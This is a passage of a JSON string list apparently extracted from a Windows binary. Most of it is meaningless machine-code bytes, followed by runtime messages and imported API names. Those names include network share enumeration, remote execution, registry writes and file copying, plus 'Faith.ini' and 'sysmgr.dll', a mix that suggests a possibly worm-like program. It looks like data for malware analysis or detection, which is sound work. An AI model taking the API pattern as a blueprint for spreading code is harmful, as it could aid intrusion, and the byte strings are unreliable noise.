            "\u044b|$$S",
            "<[|%<`~",
            "3I;}E",
            "<[|%<`~",
            "3FI;}",
            "t4t0+",
            "<}'\u020d4",
            "T$ \u064b",
            "_^]2[",
            "SUVW3hA",
            "tJ$H",
            "_^]2[4",
            "t9|$",
            "3T$@+jT$D",
            "L$$3QVh4A",
            "t5D$ PU$=",
            "xL$ FjQVT$Lh4A",
            "u\u02c3(A",
            "3T$@+h8A",
            ".A;|\u8354$D",
            "D$$3jPUL$Ph4A",
            "T$ $@",
            "u}L$ $D",
            "td|$ 3C+$@",
            "D$ EjPUL$Lh4A",
            "RUhA",
            "\u01ce_^]",
            "utUVWSh",
            "tM3D,",
            "~BD<",
            "t$Vk",
            "Vh|A",
            "G;|C",
            "t_^]Ss4",
            "SUhA",
            "T$pj",
            "D$xPY",
            "L$|h\u0527A",
            "VWT$ |A",
            "L$xj",
            "pj@RD",
            "L$pD$",
            "+\u0603~>D4p<@~",
            "<[|%<`~",
            "|$p33I;}HD4p<@~",
            "<[|%<`~",
            "QRED",
            "|$p3FI;}",
            "tgtc+",
            "<}Z\u020dt",
            "p\u044d|$0",
            "D$0P",
            "t,L$0Q",
            "T$0h\u0505A",
            "D$$RP$|",
            "SUVWh`A",
            "\u8945h\u0200A",
            "L$L\u8185D$(j Ph<A",
            "Qh,A",
            "5@`A",
            "SD$$\u058bhA",
            "Sl$(\u058bt$$",
            "\u05c5tCD$",
            "\u05c5t.L$",
            "AQh,A",
            "_^][H",
            "9h u1H$Q",
            "L$LRhA",
            "t5D$",
            "L$LRh|A",
            "3A ;vd3;}ZA$L0",
            "t7T$",
            "B$L0",
            "B$L0",
            "Qh|A",
            "L$T\u0708L$",
            "A ;wt$$L$",
            "QT$<",
            "RT$,S",
            "_^][H",
            "\u8c42h\u0200A",
            "\u8882h`A",
            ",Vt$",
            "W>\"u",
            "h(\\B",
            "h(\\B",
            "h([B",
            "|u6hHA",
            "t%HA",
            "3+\u044b([B",
            "5x`A",
            "\u058b=t`A",
            "SUVWD$",
            "=t`A",
            "- `A",
            "5x`A",
            "PR\u05c5u",
            "+P [B",
            "+P [B",
            "+PQ\u05c5u",
            "PR\u05c5u",
            "+P [B",
            "+PQ\u05c5u",
            "PR\u05c5u",
            "u L$",
            "Q\u04cbT$",
            "PD$ P\u04cbL$",
            "t6W=@`A",
            "Q\u05c5_t",
            "V5aA",
            "W= `A",
            "\u0585u hA",
            "U- `A",
            "SUVWD$",
            "Ku-`A",
            "|jD$",
            "SVWP:B",
            "Br;|]T$",
            "3jRV$",
            "tf=`A",
            "FjRV$",
            "u_^[",
            "SUVD$$WP3hdA",
            "\\$0\\$%\\$",
            "\\$&\\$ \\$'\\$#\\$$\\$!\\$(n",
            "RShA",
            "h(\\B",
            "Qh\\A",
            "D$ $",
            "3T$l+",
            "L$lQ",
            "D$l$",
            "PQhPA",
            "T$l$",
            "RP$x",
            "T$|$",
            "L$lhDA",
            "T$lj.Re/",
            ";t'L$l|$l+3I+\u0283@s",
            "mT$,\tT$,<A",
            "L$,$",
            "QRb&",
            "`8\\$",
            "t&L$,h8A",
            "SR_18\\$",
            "t.D$,$",
            "L$,h0A",
            "D$,hA",
            "|$$SGSU\\$&\\$'\\$#\\$$\\$!\\$(|$0*",
            "3;~+|$",
            "t$U$",
            "F;|j",
            "IRD$",
            "Ph\\A",
            "RPD.",
            "D$ u",
            "t`$0",
            "h(\\B",
            "T$ R.",
            "_^][",
            "VWfL$",
            "|$p A",
            "|$XD$",
            "VfT$$D$&3iv",
            "j@Q\u8fd1",
            "T$0jR",
            "RT$$h4A",
            "D$TjP",
            "D$hL$XPQh\\A",
            "uPD$HjPj",
            "L$xPh4A",
            "T$\\RPh\\A",
            "T$(jRj",
            "L$<QShA",
            "|][_",
            "PhcB",
            "tW$(",
            "Rh`A",
            "SUVWth$",
            "PhcB",
            "tOTA",
            "+h([B",
            "RPE)",
            "t?$4",
            "v)$4",
            "uP:B",
            "D$$Rh([B",
            "QD$8RPh\u0229A",
            "QRh([B",
            "Qh\\B",
            "j P-*",
            "Qh0A",
            "RPh([B",
            "+h[B",
            "D$ RP&",
            "u?$4",
            "v)$4",
            "uP:B",
            "j.P$",
            "QRh[B",
            "Ph[B",
            "Rh\\B",
            "Ph,A",
            "Qh(A",
            "oh[B",
            "_^][t6",
            "t%hcB",
            "UVWD$",
            "Ph\\B",
            "t,hcB",
            "ntR-$`A",
            "Q\u054dT$",
            "@PhA",
            "#ohdB",
            "nhP:B",
            "Qh(A",
            "mt^$",
            "Ph,A",
            "lu#\t",
            "QhcB",
            "t.TA",
            "L$ hLA",
            "j PhA",
            "kt#L$",
            "VRhlA",
            "@lhA",
            "Ph<A",
            "L$0jhbB",
            "L$0jhcB",
            "\u83045`A",
            "CjhA",
            "*jhA",
            "2jhA",
            "VPQhA",
            "Vh<(B",
            "h(\\B",
            "Vh#B",
            "DVh\tB",
            "VhpA",
            "VhlA",
            "VhPA",
            "@VhA",
            "VhdA",
            "DVhHA",
            "Vh@A",
            "VhLA",
            "VhTA",
            "VhHA",
            "@Vh\u062cA",
            "SUVW",
            "|$D32\u06cd$",
            "Vh*B",
            "LfT$ bB",
            "sg|$ ",
            "|\tdB",
            "jPUL$Ph4A",
            "RVhA",
            "uoD$",
            "ugT$",
            "to|$",
            "3T$$+",
            "EjPUL$Ph4A",
            "uST$$jRj",
            "D$Ph4A",
            "t&L$$jHQPj",
            "T$LPh4A",
            "D$$PV",
            "Vh*B",
            "RPh*B",
            "u L$$Qh*B",
            "D$DRPd",
            "u2VL$",
            "RPh*B",
            "LdFGL$",
            "Wh*B",
            "}.VT$",
            "D$$L$",
            "PQh*B",
            "Fg3T$",
            "Vh*B",
            "PQh*B",
            "ct6$",
            "RPh*B",
            "cFL$",
            "Vh*B",
            "uh`*B",
            "h\\*B",
            ":ch*B",
            "&c_^][tL$",
            "3WfN",
            "33fN",
            "QRD$ hA",
            "L$(hH+B",
            "D$ h",
            "T$ h",
            "L$ h",
            "Rh0+B",
            "Qh(+B",
            "RPL$",
            "Rh(+B",
            "Qh +B",
            "h +B",
            "`tm$",
            "RP `",
            "uQL$",
            "Qh\u0105A",
            "R0D$",
            "VWhl+B",
            "hT+B",
            "hP+B",
            "Rh\u0705A",
            "ht+B",
            "t\t$[B",
            "u\t2\u0114",
            "hP,B",
            "hL,B",
            "h@,B",
            "h8,B",
            "h0,B",
            "h$,B",
            "uph+B",
            "uLh+B",
            "u(h+B",
            "SUVW",
            "5@`A",
            "U\u0585D$",
            "_^]2[8",
            "|$@3$D",
            "tPD$$Pj",
            "\u04cbt<L$",
            "QUT$",
            "_^]2[8",
            "3T$`UVWX,B",
            "L$0QV",
            "T$,R[",
            "3jPUL$|h4A",
            "tt=aA",
            "D$0RP",
            "EjQUT$|h4A",
            "u[_^",
            ":t4V",
            "_^UVWu",
            "_^]UQSVW}",
            "t\";\u060br",
            "Yuy}",
            "+;r>})E",
            "YYt.E",
            "UQSVW}",
            "t#;\u020br",
            "W6Sq)",
            "\u07cb}K;M",
            "t\t3u",
            "+PSv",
            "t6t7)E",
            " 3+E",
            "j@t$",
            "VEEE",
            "YY^SUVW|$",
            "7G-t",
            "7G3\u06c3=/B",
            "7G\u03c3-u",
            "_^][t$",
            "lYVt$",
            "t$V0",
            "YY^j",
            "5|{B",
            "^S\\$",
            "UVWu",
            ";5/B",
            "wDVSUn8",
            "Yt$CH;r",
            "SU]0",
            "5|{B",
            "tACH;r",
            "PSW&",
            "5|{B",
            "=|eB",
            "_^][SVt$",
            "3w*;",
            "Yu+Vj",
            "5|{B",
            "u\"=|eB",
            "_^[3\u030bL$",
            "tOL$",
            "u^[_3",
            "F8u~a",
            "8u\u010aA",
            "8t3^[_",
            "G^[_",
            "^[_UWVu",
            "r)$@",
            "DDDDDDDDDDDDDD",
            "t1|9",
            "+$H@",
            "r$@@",
            "r$@@",
            "Z$@@",
            "_9=8eB",
            "=4eB",
            "u<{B",
            "Vq;r",
            ";5{B",
            "s^h$A",
            "YYh,A",
            "YY[u",
            "=8eB",
            "_Vt$",
            "fEf;",
            "u;fEf;",
            "u.fEf;",
            "u!fEf;",
            "fEf;",
            "VWuHeB",
            "_@eB",
            "to|$",
            "SVW}",
            "E|[W",
            "]t)\u058b",
            "t(;s\":",
            "uu\"4",
            ")EEM",
            "_^[U SVu",
            "3Y}j",
            "B_+^",
            "#[5|eB",
            "w\"t$",
            "Yu3Vt$",
            ";5/B",
            "5|{B",
            "^UW}",
            "3AOE",
            "SVEWP",
            "EjdY",
            "PEE>",
            "^_U@",
            "PV:B",
            "3^t$",
            "tKMQP",
            "t<EPEP",
            "s+\u020b\u0105",
            "P\u030dB[",
            "B8t\u0444tQ",
            "u^_[3",
            "B8t6t8t't",
            "t^_B[",
            "B^_[",
            "B^_[",
            "B^_[USVWu",
            "_^H[]U}",
            "Vt*u",
            "^_[];}",
            "tl<%t2",
            "0%{B",
            "F>#u",
            "3[]U",
            "SVZW",
            "tnHtS",
            "HHtiHtGH",
            "jd^jdY",
            "HtHHt(",
            "SVWu",
            "SVWu",
            "SVWu",
            "HtOHt)H",
            "39A u",
            "_^[]",
            "F\tu_^UQ3W9",
            "s;IVu",
            "t%SE",
            "_USVu",
            "@;r_^[]UQS]",
            "HtsMt=a",
            "f_^[It",
            "It\"It",
            "V<'t+",
            "It&It",
            "S4It",
            "=$0B",
            "Wj<E",
            "}\t<V",
            "Y\u0205\u0249M",
            "^]}F",
            "Y^V#",
            "3^SVt$",
            ">+~&WPv",
            "_^[j",
            "YSVW33395@zB",
            "~M(jB",
            "t0|$",
            "P.Yt",
            "F;5@zB",
            "_^[UjhcA",
            "hT!A",
            "XSVWe",
            "Yu6#",
            "u\u040dEP",
            "XPuVV",
            "\tMPQ3=",
            "eu=leB",
            "=leB",
            "SUVW|$",
            ";=`{B",
            "Y;Yt",
            "3WAG",
            "t\tUE",
            "_^][Vt$",
            "^Vt$",
            "uR<peB",
            "SW<peB",
            "u SWY",
            "X_[^3^",
            "Vt\"t$",
            "t)Vlf",
            "PJY^UH",
            "SVW}",
            "G\u06c9uu}",
            "Mu39U",
            "MU\u0309U\u0609UUUUx",
            "*u#E",
            "\u02cdDA\u0409E",
            "It.ht lt",
            "GGM}",
            "HHtpHHtl",
            " M@;\u0289}",
            "Pt;0",
            "E}2E",
            ")Zt2\ttH",
            "Yt3H",
            "uHM@E",
            "PPEP",
            "t]EE0",
            "EHEE",
            "E Yt\tfMf",
            "YAE t!E@E",
            "Y3E@t",
            "EEEM",
            "t;ERPWVEU",
            "u\u010b\u06030uWVA",
            "]\u050bEM",
            "\ubd4dE+EEE",
            "M90u",
            "]@t&",
            "u+u+u",
            "EPEu",
            "~;E]xf",
            "CPEPC?@",
            "YY~2MQu",
            "Vj q",
            "E_^[",
            "]VW|$",
            "O~!t$",
            "_^S\\$",
            "KVW~&|$",
            "WFt$",
            "f@USVu",
            "WtdF",
            "WPS{",
            "_WPS(",
            "^[]U",
            "s)ME\t",
            "@\u020d+\u0281",
            "|\u030b+Ej",
            "r3E;",
            "\u01cdMWQu",
            "_^[UWVu",
            "r)$(@",
            "r$(@",
            "r$(@",
            "r$(@",
            "DDDDDDDDDDDDDD",
            "t1|9",
            "^_Vt$",
            "u\tV\t:",
            "tltgV",
            "<`zB",
            "W;5`{B",
            "ubHt",
            "GM9M",
            "_^[UQQSV50A",
            "3\u06c9]]",
            "rt`+tE",
            "@u}@",
            "rbtHHt.",
            "u@u;@S9]u.E",
            "<9]u",
            "SUV333;W~]",
            ";|?4$j ",
            "_^][UQE",
            "ARV5-B",
            "QPEPj",
            "u\tD$",
            "S\u060bD$",
            "5|{B",
            "5|{B",
            "%p{B",
            "%t{B",
            "j?I_M",
            "!|D\tu+M",
            "j?_M",
            "j?UIZ;\u0289M",
            ";tkMQ",
            "!TD\tu+M",
            "u\t9}",
            "\t8]E",
            "=<aA",
            "HCp{B",
            "ulSj",
            "\u05e1p{B",
            "5|{B",
            "\u0221p{B",
            "QPDE",
            "5h{B",
            "_^[U",
            "3uEl{B",
            ";#M#",
            "r;]uy;\u0609]",
            ";#M#",
            ";uY;]s",
            ";]u&;\u0609]",
            "|D#M#",
            "pD#U#ue",
            "tU3i",
            "MLD#u",
            "j #M_|",
            "j?^;",
            "ua }+",
            "\u04c9]#\\D\\D",
            "M\t|D/}",
            "\t7Mt",
            "%p{B",
            "VW3;u0DP",
            "P5x{B",
            "W5|{B",
            "5|{B",
            "W5|{B",
            "_^UQM",
            "SVWq",
            "Cj?i",
            ";w<G",
            "H;v\u01cbEO",
            "_^[U",
            "SVW}",
            "MOI;M",
            "\\9|9]",
            "I?Mv",
            "j?YM_",
            "uH s",
            "!\\D\tu+M",
            "OL1?v",
            "j?_]",
            "BD2G",
            "K\\3u",
            "NK?v",
            "j?^E",
            "j?^O",
            "uG s",
            "j?^M|",
            "\t9DD",
            "X_^[",
            "X3\u030bT$",
            "tG3D$",
            "GJuD$",
            "U$S]",
            "4 6B",
            "t } u =$0B",
            "VWss\u020b",
            "<`zB",
            "tVP9&",
            "3t\tP",
            "DSUVWh",
            "-Y5`zB",
            "f|$B",
            "95`{B",
            "}RdzB",
            "~Yt8",
            "95`{B",
            "5`{B",
            ";|3\u06e1`zB",
            "<4uMF",
            "|5`{B",
            "_^][DU",
            "3\u06c3=/B",
            ";t6MWEWP%",
            "FPi*",
            "FPW*",
            "]]]E",
            "F=/B",
            "PmYY",
            "DC\u0409EeN",
            ">t^*t2FtTIt",
            "Lu7EE~",
            "6u,~",
            "u#E\u0403e",
            "'E\"ht",
            "@E\u0500e",
            "3 nut(ct",
            "YE39Et\t9E",
            "g~8it",
            "jd^]-",
            "]\uc375<-u",
            "t\t}]",
            "t!EMt",
            "FEWp",
            "ufEMt\\EWM",
            "Y]F=/B",
            "t!EMt",
            "Y]\ubec3}",
            "et\tE",
            "EMtv",
            "eFEW",
            "Y-]u",
            "Y]=/B",
            "SxYY",
            "FMWSr",
            "EuHP",
            "+u\"Mu",
            "Yx]t/Xt*xE",
            "YYj0[",
            "Y\u0609]jx\u03c0}",
            "Mj Ej",
            "?]u\t]GE ",
            "<]t_G<-uAt=",
            "]t6G:s",
            "BNu2",
            "uMWuuS",
            "YEt~j",
            "3\u02c5t`}",
            "YE5/B",
            "EPEPt#",
            "FudE\\MWP",
            "YY9u",
            "E\u0303}c",
            "Et\tf ",
            "+u\"Mu",
            "Y\u0609]}",
            "xuO=/B",
            "E\u060bUj",
            "SE\u0609U}",
            "Y]S=/B",
            "t]ou",
            "8}SE\u060bUj",
            "uuE\u0609UEC\u0419",
            "Mt$u",
            "Y]+u",
            "E\u060bM\u0603",
            "xt?pt:=/B",
            "tvou",
            "?<8=/B",
            "Y]E}",
            "Mt$u",
            "Y]\\u",
            "u)E\u0303}",
            "E\u050bM\u0609",
            "f8EE",
            "F;\u0209u",
            "u>M}u",
            ">%uME",
            "MWP}",
            "MWSs",
            "E_^[",
            "YYVt$",
            "YYu_^",
            "tAt2t$",
            "\u034dAL$",
            "]EuMm]E",
            "X3hDdA",
            "h(dA",
            "eYt,F=/B",
            "@H80t8",
            "X3UQQ}",
            "U=eB",
            "SVt']",
            "Q3\u02438-",
            "YY8E",
            "P3>-",
            "3hXdA",
            "A80t<^",
            "-Ad|",
            "SUl$",
            "VWt*eB",
            ";uG3\u0243>-",
            "\\$$VF",
            "P3>-",
            "GY}(=eB",
            "Sj0W&",
            "_^][USVW}",
            "3\u02438-PS",
            "|!;}",
            "Fu FSu",
            "_^[]t$",
            "g%eB",
            "H%eB",
            "et2}",
            "Et,}",
            "]W|$",
            "V@PV",
            "^_W|$",
            "tAt#t",
            "tt4t'",
            "=HfB",
            "QSUVW3hdA",
            "3-eB",
            "k<f9-eB",
            "Z 0B",
            "\u01a3 0B",
            "f9-2fB",
            "k<(0B",
            "-$0B",
            "-(0B",
            "PUj? ",
            "SheB",
            "W5gB",
            "PUj?50B",
            "SheB",
            "W5gB",
            "PV9\"",
            "5DfB",
            "SVn@P*",
            ";\u0163DfB",
            "V50B",
            "F_VmY0i",
            "F>:uNFV?k<Y",
            "F>:u#FV",
            ";\u0163$0B",
            "V50B",
            "_^][YSVW39=$0B",
            "9=eB",
            "Qf9=0fB",
            "WQPWS",
            ",f9=eB",
            "WWWWj",
            "WWSj",
            "WWWj",
            "_^[;|;",
            ":%_E",
            "u+E$",
            "E00B",
            "E(k<",
            "E00B",
            "+A0B",
            "^[]UWVSu",
            "F'G8t,A<",
            "A,A<",
            "G8tPSb",
            "[^_Ul$",
            "+@;|",
            "^dfB",
            "\u0423lfB",
            "^j<\\fB",
            "^_[XfB",
            "\u020bTfB",
            "k<+\u0203%pfB",
            "t%PF",
            "\u01a3@zB",
            "P\u8ae9Y(jB",
            "Yu!j",
            "V5@zB",
            "\u84a9Y(jB",
            "BY3\u02780B",
            "=`3B",
            "|3\u04b90B",
            "\t BP1B",
            "|^~=0eB",
            "4I+\u044d4h3B",
            "Y53B",
            "V`3B",
            "4I4`3B",
            "V5{B",
            "<\"u%F",
            "F<\"t",
            "YtF>\"u",
            "F> w",
            "< v^S39",
            "5deB",
            "GVYt",
            "P\u84efY;5",
            "j\tY=deB",
            "t9UWYE?=t\"U^;Y",
            "j\t}YW6Y",
            "u]5deB",
            "[UQQS39",
            "5(eB",
            "EPEPSSWM",
            "\u06ffYEPEPE",
            "8\"uDP",
            "@\"t)t%",
            "F8\"uF@C",
            "F@ t\tt\t\tu\u0304u",
            "3\u06c08\\u",
            "@C8\"u,",
            "u%39}",
            " t?\tt:}",
            "]QQgB",
            "SU-,aA",
            "VW333;u3\u054b;t",
            "@@f9",
            "u@@f9",
            "u+\u018b=`A",
            "SS@SSPVSSD$4\u05cb;t2U+;YD$",
            "t#SSUPt$$VSS\u05c5u",
            "$Y\\$",
            "uL;u",
            ";t<8",
            "u+@U\u012bY;u",
            "3_^][YYUSVWUj",
            "ht A",
            "]_^[]",
            "SVWD$",
            "Pjh| A",
            "D$ X",
            "t.;t$$t(4v",
            "_^[3d",
            "SQ3B",
            "SQ3B",
            "VC20XC00U",
            "SVWU]",
            "EECs",
            "tEVUk",
            "t3x<{",
            "]_^[]UL$",
            "u*=-B",
            "3\u02783B",
            "A=4B",
            "\\hxgA",
            "PsYY\\WP\\.@Y<v)\\P",
            "htgA",
            "`hXgA",
            "`WP `hTgA",
            "`h,gA",
            ",_&E",
            "P6YP6j",
            "B=5B",
            "SVW33`zB",
            "\u018b\u0603uT",
            "G `{B",
            "V}Yt3",
            "WsR\u020b",
            "<`zB",
            "<1u6=-B",
            "<`zB",
            "t78t2=-B",
            "]SVD$",
            "3\u060bD$",
            "A\u020b\\$",
            "N3\u048b^[",
            "3P\u020b\\$",
            "\u83a4YL$",
            "S3VWE",
            "]t\t]E",
            "^#+t-Ht!Ht",
            "t& t",
            "5t.;t*;t",
            "t\t;t",
            "\t\u0603;u",
            "VuEPuuu",
            "VS\"YEY",
            "<`zB",
            "uxttE",
            "tM?e",
            "_^[UjhgA",
            "hT!A",
            "SVWe\u8848gB",
            "3;u>EPj",
            "^VhgA",
            "EPVhgA",
            "E;tc]<",
            "$\u82a4euWSV",
            "e33M;t)uVu",
            "3e\u030bMd",
            "_^[USVu",
            "3^[]9",
            "tM/B",
            "~*9E",
            "|/39]",
            "PVj\t5gB",
            "Vj\t5gB",
            "y\u0283=/B",
            "33S\\$",
            "VtAt$",
            "UQV}u:",
            "%Pt$",
            "YYS\\$",
            ";t\t;u",
            "UQ=gB",
            "SVWu",
            ";^}%95/B",
            "VSYY",
            "X#\u0185u",
            "]\tX\te\t",
            "PW5gB",
            " t;u",
            "Vj Yj",
            "X^3^",
            "SVWj \\$",
            "X+P7",
            "}_^[UQQE",
            "SVWxj Ye",
            "j ^j",
            "t!CSu",
            "NYEYE",
            "E@;}",
            "+\u020d<3E_^[",
            "+Z04",
            "Ju^W|$",
            "SVWj }",
            "u\u070b}j",
            "y_^[U",
            "Eu&E3P",
            "EPYj",
            "EPEPw",
            "EPY<;",
            "EPEPvEVPw",
            "@PEP 3|;",
            "|(EPVw",
            "MEPmw",
            "IYY3j",
            "1_^[h`6B",
            "hx6B",
            "3PPPPu",
            "EP$U",
            "3PPPPu",
            "EP$UU",
            "H89u",
            "W@PWV\u8dd0",
            "_^[]U",
            "WPEPO",
            "YuYhgB",
            "^UQU",
            "SVWfB",
            "!3;u",
            "_^[j",
            "NY\u030bL$",
            "WtzVS\u064bt$",
            "GIt%t)",
            "Gt/KuD$",
            "GKu[^D$",
            "t\u0784t,t",
            "[^_\u030bT$",
            "t&:a",
            "\ub303={B",
            "Wteu",
            "95 eB",
            "tF\\$",
            "t>SY",
            "t/P~;Yv",
            "<8=u",
            "3_^[VWj",
            "3^95@zB",
            "~D(jB",
            "PrYt",
            "4(jB",
            "F;5@zB",
            "|_^j",
            "SVWu",
            "Y;5gB",
            "3\u04b86B",
            "90tr0B=7B",
            "|EPV",
            "j@3Y iB",
            "@j@3Y iB",
            "@;vAA9",
            "Y$jB",
            "UAAy",
            "X!iB",
            "Y$jB",
            "Wj@Y3 iB",
            "EVP5gB",
            "@;rE\u0185 t7SWU",
            "A    ",
            "BBBu_[j",
            "5$jB",
            "PVPj",
            "VPVPV5$jB",
            "VPVPh",
            "5$jB",
            "\u3020 hB",
            "@AA;rI3",
            "\u0200  hB",
            " \u0200  hB",
            "@;r^",
            "VWuBhgA",
            ";tg5@`A",
            "W\u0585gB",
            "tPhgA",
            "WhgA",
            "S\u040bt$",
            "_^[3U",
            "+~oh",
            "\u05c3=dB",
            "YY@}>j",
            "^[UjhgA",
            "hT!A",
            "SVWe39=gB",
            "uFWWj",
            "[ShgA",
            "\"WWShgA",
            "9} u",
            "E WWu",
            "@Pu ",
            "$\u8511e\u0109E\u0703M",
            "e3}\u0703M]9}tfSuu",
            "tMWWSuu",
            "u;t2E",
            "t@9}",
            "3e\u020bMd",
            "_^[E",
            "$e\u0709]M",
            "e33\u06c3Mu;tVSuuu",
            "VSh ",
            "qlT$",
            "VW0x",
            "3;VEN@",
            "vQWE",
            "}SpSjEPS",
            "EEPS",
            "u3_9S",
            "YfE^fC",
            "[U\\SVW}",
            "E3ZE\u0609UEEE\u0709EE\u0509E\u0409EEE}",
            "X\ub7801U|",
            "+t1-t,0tRC",
            "1|\t9",
            "VP\u83afYYj",
            "A#\u0185t",
            "EE0E",
            "A#\u0185t",
            "EE0EM",
            "VP\u8f2eYYj",
            "WO1M",
            "+ttHHtd",
            "eU0u",
            "\tj\tXO0uD} ",
            "3=/B",
            "P\u042dYY",
            "tA\u0401P",
            "u=/B",
            "P\u81adYY",
            "X9Ev",
            "EEEHE",
            "MEEPEuPjE3\u0243",
            "E9Mu",
            "t`3\u06f8",
            "^=}\tE",
            "PEPb",
            "u\u018bE\u0283",
            "33333333E",
            "3333E",
            "[YAA",
            "#fWEEEEEEEEEEEE?E",
            "f;uz",
            ";u#}",
            "NfUkM}",
            "f}?r",
            "EFPEPL",
            "EP]M",
            "EPnNYuO",
            "PEPEPEM",
            "HHH5K",
            "|0;r",
            "0H;s",
            "E_^[;r",
            "H;sf#",
            "3]5gB",
            "5$jB",
            "]QSUV5 eB",
            "WWWWjPWj",
            "\u04cb;t>U0;YD$",
            "t/WWUPj6Wj",
            "Y;Yu3_^][Y",
            "^U$S]",
            "3WEE\u0709EEfF",
            "3##\u0281",
            "3f;u",
            "EEEE",
            "MEEM",
            "MQP1",
            "Mu\u0203E",
            "~%Eu",
            "KYu}",
            "u5}u,e",
            "_^[U",
            "3\u0243`9M",
            "tAVWE",
            "}MuVu",
            "rYY39M",
            "u_^[Ujh",
            "hT!A",
            "0SVWe39",
            "_u@WgA",
            "PWPSS",
            "#WgA",
            "PWPSS",
            "9] u",
            "E ;t\t9]",
            "AEPu ",
            ";~,}",
            "r\"E8]t",
            ":v@@8",
            "rE8]tP",
            "x@@8",
            "uzSSVu",
            "j\tu ",
            "e\u0109E\u0703M",
            "e3\u06c9]\u0703Mu",
            "uuVu",
            "Wu 5",
            "\u0585tySSu",
            "j\tu \u058bu;ta}",
            "$\u8581e}\u0603M",
            "e33Mu;t-VWu",
            "VWuuu",
            "3eMd",
            "@Iu8",
            "UQQSVW39}",
            "tUj=u",
            "Y;Yut@9u",
            ";uT9}",
            "9= eB",
            "xt>_^[;",
            "t\u07c989= eB",
            "|;Y eB",
            "t\u01098+u",
            "YY|C?",
            "t>t24<rY?",
            "PurYYt<5E",
            "2uz}",
            "PWjrYY",
            "4@@P{YYt.u",
            "VKY+E",
            "VqY3V5",
            "t-|$",
            "WPt$",
            "8<=t",
            "VP){Yu",
            "j\tFY",
            "^][_U=",
            "~YY]",
            "#]Vt$",
            "V\u8bba@PjzYYt",
            "VP\u02bfYY^3^%(aA",
            ";5`{B",
            "t=SWj",
            "UWV}",
            "OO;s",
            "'FO^_U}",
            "SVWt",
            "Aw\u0680!",
            "IG;r_^[]UQgB",
            "]u!E",
            "ugVWj",
            "SSSj",
            "VP ;t8Wx;YEt*j",
            "SWPju",
            "V5gB",
            "YYunE",
            "Y_^[UQgB",
            "]u!E",
            "ugVWj",
            "SSSj",
            "VPW ;t8W",
            "x;YEt*j",
            "SWPju",
            "V5gB",
            "NYYumE",
            "Y_^[",
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            "H:mm:ss",
            "dddd, MMMM dd, yyyy",
            "M/d/yy",
            "December",
            "November",
            "October",
            "September",
            "August",
            "July",
            "June",
            "April",
            "March",
            "February",
            "January",
            "Saturday",
            "Friday",
            "Thursday",
            "Wednesday",
            "Tuesday",
            "Monday",
            "Sunday",
            "am/pm",
            " (8PX",
            "700WP",
            "`h````",
            "ppxxxx",
            "(null)",
            "GAIsProcessorFeaturePresent",
            "KERNEL32",
            "e+000",
            "SunMonTueWedThuFriSat",
            "JanFebMarAprMayJunJulAugSepOctNovDec",
            "runtime error ",
            "TLOSS error",
            "SING error",
            "DOMAIN error",
            "R6028",
            "- unable to initialize heap",
            "R6027",
            "- not enough space for lowio initialization",
            "R6026",
            "- not enough space for stdio initialization",
            "R6025",
            "- pure virtual function call",
            "R6024",
            "- not enough space for _onexit/atexit table",
            "R6019",
            "- unable to open console device",
            "R6018",
            "- unexpected heap error",
            "R6017",
            "- unexpected multithread lock error",
            "R6016",
            "- not enough space for thread data",
            "abnormal program termination",
            "R6009",
            "- not enough space for environment",
            "R6008",
            "- not enough space for arguments",
            "R6002",
            "- floating point not loaded",
            "Microsoft Visual C++ Runtime Library",
            "Runtime Error!",
            "Program: ",
            "<program name unknown>",
            "GetLastActivePopup",
            "GetActiveWindow",
            "MessageBoxA",
            "user32.dll",
            "1#QNAN",
            "1#INF",
            "1#IND",
            "1#SNAN",
            "KERNEL32.DLL",
            "ADVAPI32.dll",
            "MPR.dll",
            "RASAPI32.dll",
            "USER32.dll",
            "WS2_32.dll",
            "Sleep",
            "DeleteFileA",
            "GetPrivateProfileSectionA",
            "CloseHandle",
            "GetExitCodeProcess",
            "OpenProcess",
            "FreeLibrary",
            "TerminateProcess",
            "GetProcAddress",
            "GetVersionExA",
            "CopyFileA",
            "GetTempFileNameA",
            "GetTempPathA",
            "RemoveDirectoryA",
            "CreateDirectoryA",
            "GetComputerNameA",
            "GetModuleFileNameA",
            "LoadLibraryA",
            "GetPrivateProfileStringA",
            "SetThreadPriority",
            "TerminateThread",
            "WaitForSingleObject",
            "CreateThread",
            "CreateEventA",
            "WinExec",
            "WaitForMultipleObjects",
            "ExitThread",
            "FindNextChangeNotification",
            "FindFirstChangeNotificationA",
            "GetDriveTypeA",
            "GetLogicalDriveStringsA",
            "SetEvent",
            "GetModuleHandleA",
            "GetLastError",
            "CreateMutexA",
            "SetLastError",
            "GetPrivateProfileIntA",
            "GetWindowsDirectoryA",
            "WritePrivateProfileStringA",
            "SetFileAttributesA",
            "GetShortPathNameA",
            "lstrlenA",
            "SetEnvironmentVariableA",
            "GetSystemTime",
            "GetLocalTime",
            "HeapFree",
            "GetEnvironmentStrings",
            "HeapReAlloc",
            "FreeEnvironmentStringsA",
            "UnhandledExceptionFilter",
            "FreeEnvironmentStringsW",
            "WideCharToMultiByte",
            "CompareStringA",
            "LCMapStringW",
            "LCMapStringA",
            "SetEndOfFile",
            "GetOEMCP",
            "CompareStringW",
            "GetSystemDirectoryA",
            "GetACP",
            "GetCPInfo",
            "GetStringTypeW",
            "GetStringTypeA",
            "MultiByteToWideChar",
            "CreateFileA",
            "SetStdHandle",
            "RtlUnwind",
            "GetEnvironmentStringsW",
            "FindFirstFileA",
            "FindNextFileA",
            "VirtualAlloc",
            "VirtualFree",
            "HeapCreate",
            "GetStdHandle",
            "SetHandleCount",
            "SetFilePointer",
            "GetFileType",
            "FlushFileBuffers",
            "HeapAlloc",
            "ExitProcess",
            "GetCurrentProcess",
            "GetTimeZoneInformation",
            "HeapDestroy",
            "FileTimeToLocalFileTime",
            "GetStartupInfoA",
            "FindClose",
            "FileTimeToSystemTime",
            "WriteFile",
            "GetVersion",
            "GetCommandLineA",
            "ReadFile",
            "RegQueryValueExA",
            "RegEnumValueA",
            "RegCloseKey",
            "RegSetValueExA",
            "RegDeleteValueA",
            "RegOpenKeyExA",
            "RegNotifyChangeKeyValue",
            "WNetAddConnection2A",
            "WNetCloseEnum",
            "WNetOpenEnumA",
            "WNetEnumResourceA",
            "WNetCancelConnection2A",
            "RasEnumConnectionsA",
            "RasGetConnectStatusA",
            "GetWindowTextA",
            "FindWindowA",
            "MessageBoxA",
            "GetMessageA",
            "PostMessageA",
            "ShowWindowAsync",
            "CharToOemA",
            "EnumWindows",
            "%s\\Faith.ini",
            "Faith",
            "%s\\Win.ini",
            "WinIni",
            "%s\\sysmgr.dll",
